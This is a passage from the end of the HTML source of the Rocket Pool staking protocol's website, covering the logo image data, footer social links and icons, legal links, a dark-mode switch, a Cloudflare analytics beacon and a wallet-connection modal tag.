IxolOrcpOYbeWHq+k4LkcGy/JLWLHcjoemPdN0fehOnhrVk4mtIOHZqBw/HpoMY0+AxDhu3M0H9nre/kag9arNHHY9C8XUwu/4PmX6l3W4gajV+xa0xyjoD4nkSS8YK+Iqdf27JUsaY6Bgwut3jvkqhejc01EdCQN+QYt7TOukZmi9yn8/ZOI8eYu8potlYYhDQuiEal9+mDbXSwEY+97V6XA6j4uSeIX3HXWsB1YUC0azyY/3I7Pcwgm57dq35UdOc+3vRsRt5WNjvpq93FiXAzijRBHAdff4v1r2ij141d7Y+psLGUY8weNCpOzBqpDi6AaL2lf2bWayTYBbb+6xFpxqqUUsoPjjMNMxyjfMgZbips69eYn8QBecXzmuhVcrh0ogtmy3y28MbQ2t0VcPY7DFuenv39OBeUc32BZ/y7Zgp8mu5LHV7uCstTiZxT1WUlw6BZiK/xgWkYs5rZVEWDXJe7QWBJa8whp32XpvfngkIzgoBG2uQKMjxzZSsTLY2qtXS1/WNm336HEDI44iQjhcGVq0KOkTclDzS7InYQzz7q1NC9fgsiPQTrjxEgrdd6HTsbyP+leQkjl4S1o5xQ5bW6QmmmMLcsOQDAmY6V9G3llICXM2K5TWjgUVavsLZiQaBUogvXtXxNYqlbSKQYIJ6peXI6zl5HZ3DPmGA7LVMYHlJwgDBeXXVQqToMFHJDuZS1RNrK1Nzzx+0NtRfxqIn9jqbrYgxV2G3kKMaX1sDxG+cUF/NKBYEZaeAAN6lfSQj3jH3JPwKzQ6YrdeJNhW+Jl/zuZLSrLUqRybJJYlpE71LHY7sIQQ7DOn9IANUcH+r4C3b5GhM3aW2wd5CLyGzPgBAyAAA" width="112" height="112" alt="Rocket Pool - Your friendly decentralised Ethereum liquid staking protocol" title="Rocket Pool" loading="lazy"><p class="text-center text-xxs text-primary sm:text-base">Rocket Pool</p><p class="text-center text-xxs text-gray sm:text-base">Decentralised Ethereum Liquid Staking Protocol</p><div class="flex justify-center space-x-6"><a href="https://discord.gg/rocketpool" class="text-xxs hover:text-black dark:hover:text-white sm:text-base" target="_blank" rel="noreferrer"><span class="sr-only">Discord</span><svg aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" class="h-6 w-6 fill-gray hover:fill-black dark:hover:fill-white"><path d="M524.5 69.84a1.5 1.5 0 0 0 -.764-.7A485.1 485.1 0 0 0 404.1 32.03a1.816 1.816 0 0 0 -1.923 .91 337.5 337.5 0 0 0 -14.9 30.6 447.8 447.8 0 0 0 -134.4 0 309.5 309.5 0 0 0 -15.14-30.6 1.89 1.89 0 0 0 -1.924-.91A483.7 483.7 0 0 0 116.1 69.14a1.712 1.712 0 0 0 -.788 .676C39.07 183.7 18.19 294.7 28.43 404.4a2.016 2.016 0 0 0 .765 1.375A487.7 487.7 0 0 0 176 479.9a1.9 1.9 0 0 0 2.063-.676A348.2 348.2 0 0 0 208.1 430.4a1.86 1.86 0 0 0 -1.019-2.588 321.2 321.2 0 0 1 -45.87-21.85 1.885 1.885 0 0 1 -.185-3.126c3.082-2.309 6.166-4.711 9.109-7.137a1.819 1.819 0 0 1 1.9-.256c96.23 43.92 200.4 43.92 295.5 0a1.812 1.812 0 0 1 1.924 .233c2.944 2.426 6.027 4.851 9.132 7.16a1.884 1.884 0 0 1 -.162 3.126 301.4 301.4 0 0 1 -45.89 21.83 1.875 1.875 0 0 0 -1 2.611 391.1 391.1 0 0 0 30.01 48.81 1.864 1.864 0 0 0 2.063 .7A486 486 0 0 0 610.7 405.7a1.882 1.882 0 0 0 .765-1.352C623.7 277.6 590.9 167.5 524.5 69.84zM222.5 337.6c-28.97 0-52.84-26.59-52.84-59.24S193.1 219.1 222.5 219.1c29.67 0 53.31 26.82 52.84 59.24C275.3 310.1 251.9 337.6 222.5 337.6zm195.4 0c-28.97 0-52.84-26.59-52.84-59.24S388.4 219.1 417.9 219.1c29.67 0 53.31 26.82 52.84 59.24C470.7 310.1 447.5 337.6 417.9 337.6z"></path></svg></a><a href="https://medium.com/rocket-pool" class="text-xxs hover:text-black dark:hover:text-white sm:text-base" target="_blank" rel="noreferrer"><span class="sr-only">Medium</span><svg aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" class="h-6 w-6 fill-gray hover:fill-black dark:hover:fill-white"><path d="M180.5 74.26C80.81 74.26 0 155.6 0 256S80.82 437.7 180.5 437.7 361 356.4 361 256 280.2 74.26 180.5 74.26zm288.3 10.65c-49.85 0-90.25 76.62-90.25 171.1s40.41 171.1 90.25 171.1 90.25-76.62 90.25-171.1H559C559 161.5 518.6 84.91 468.8 84.91zm139.5 17.82c-17.53 0-31.74 68.63-31.74 153.3s14.2 153.3 31.74 153.3S640 340.6 640 256C640 171.4 625.8 102.7 608.3 102.7z"></path></svg></a><a href="https://x.com/Rocket_Pool" class="text-xxs hover:text-black dark:hover:text-white sm:text-base" target="_blank" rel="noreferrer"><span class="sr-only">X</span><svg aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="h-6 w-6 fill-gray hover:fill-black dark:hover:fill-white"><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"></path></svg></a><a href="https://github.com/rocket-pool" class="text-xxs hover:text-black dark:hover:text-white sm:text-base" target="_blank" rel="noreferrer"><span class="sr-only">GitHub</span><svg aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" class="h-6 w-6 fill-gray hover:fill-black dark:hover:fill-white"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3 .3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5 .3-6.2 2.3zm44.2-1.7c-2.9 .7-4.9 2.6-4.6 4.9 .3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3 .7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3 .3 2.9 2.3 3.9 1.6 1 3.6 .7 4.3-.7 .7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3 .7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3 .7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://dao.rocketpool.net" class="text-xxs hover:text-black dark:hover:text-white sm:text-base" target="_blank" rel="noreferrer"><span class="sr-only">Forum</span><svg aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="h-6 w-6 fill-gray hover:fill-black dark:hover:fill-white"><path d="M225.9 32C103.3 32 0 130.5 0 252.1 0 256 .1 480 .1 480l225.8-.2c122.7 0 222.1-102.3 222.1-223.9C448 134.3 348.6 32 225.9 32zM224 384c-19.4 0-37.9-4.3-54.4-12.1L88.5 392l22.9-75c-9.8-18.1-15.4-38.9-15.4-61 0-70.7 57.3-128 128-128s128 57.3 128 128-57.3 128-128 128z"></path></svg></a><a href="https://youtube.com/rocketpool" class="text-xxs hover:text-black dark:hover:text-white sm:text-base" target="_blank" rel="noreferrer"><span class="sr-only">Youtube</span><svg aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="h-6 w-6 fill-gray hover:fill-black dark:hover:fill-white"><path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"></path></svg></a><a href="https://www.reddit.com/r/rocketpool" class="text-xxs hover:text-black dark:hover:text-white sm:text-base" target="_blank" rel="noreferrer"><span class="sr-only">Reddit</span><svg aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="h-6 w-6 fill-gray hover:fill-black dark:hover:fill-white"><path d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"></path></svg></a></div><p class="text-center text-xxs text-gray sm:text-base"><span class="pr-4"><a href="/privacy-policy.pdf" class="text-xxs text-gray hover:text-black dark:hover:text-white sm:text-base">Privacy Policy</a></span><span class="pr-4"><a href="/terms-of-service.pdf" class="text-xxs text-gray hover:text-black dark:hover:text-white sm:text-base">Terms of Service</a></span></p><p class="text-center text-xxs text-gray sm:text-base"><span class="pr-4">© Rocket Pool Pty Ltd.</span></p></div></div><div class="hidden justify-center pt-3 relative right-1"><span title="Expand"><svg aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="h-5 w-5 cursor-pointer fill-gray hover:fill-black dark:hover:fill-white" title="Increase default width"><path d="M144 64c8.8 0 16 7.2 16 16s-7.2 16-16 16H32V208c0 8.8-7.2 16-16 16s-16-7.2-16-16V80c0-8.8 7.2-16 16-16H144zM0 304c0-8.8 7.2-16 16-16s16 7.2 16 16V416H144c8.8 0 16 7.2 16 16s-7.2 16-16 16H16c-8.8 0-16-7.2-16-16V304zM496 64c8.8 0 16 7.2 16 16V208c0 8.8-7.2 16-16 16s-16-7.2-16-16V96H368c-8.8 0-16-7.2-16-16s7.2-16 16-16H496zM480 304c0-8.8 7.2-16 16-16s16 7.2 16 16V432c0 8.8-7.2 16-16 16H368c-8.8 0-16-7.2-16-16s7.2-16 16-16H480V304z"></path></svg></span><span title="Compress"><!----></span></div><label class="dark_mode_switch" aria-label="Dark Mode"><label for="darkmode" class="hidden">Dark Mode</label><input class="dark_mode_switch__input" type="checkbox" id="darkmode"><span class="dark_mode_switch__in"><span class="dark_mode_switch__box"></span><span class="dark_mode_switch__icon dark_mode_switch__icon_dark"><svg class="icon icon-dark"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon"><path stroke-linecap="round" stroke-linejoin="round" d="M21.752 15.002A9.72 9.72 0 0 1 18 15.75c-5.385 0-9.75-4.365-9.75-9.75 0-1.33.266-2.597.748-3.752A9.753 9.753 0 0 0 3 11.25C3 16.635 7.365 21 12.75 21a9.753 9.753 0 0 0 9.002-5.998Z"></path></svg></svg></span><span class="dark_mode_switch__icon dark_mode_switch__icon_light"><svg class="icon icon-light"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v2.25m6.364.386-1.591 1.591M21 12h-2.25m-.386 6.364-1.591-1.591M12 18.75V21m-4.773-4.227-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0Z"></path></svg></svg></span></span></label></div></footer><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----></div><script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;rayId&quot;:&quot;95f36eb4fb047789&quot;,&quot;serverTiming&quot;:{&quot;name&quot;:{&quot;cfExtPri&quot;:true,&quot;cfEdge&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfL4&quot;:true,&quot;cfSpeedBrain&quot;:true,&quot;cfCacheStatus&quot;:true}},&quot;version&quot;:&quot;2025.6.2&quot;,&quot;token&quot;:&quot;4281bd9a1a414b5c966f1a7bdaec078c&quot;}" crossorigin="anonymous"></script>
+<w3m-modal style="--local-border-bottom-mobile-radius: 0px;"></w3m-modal></body></html>
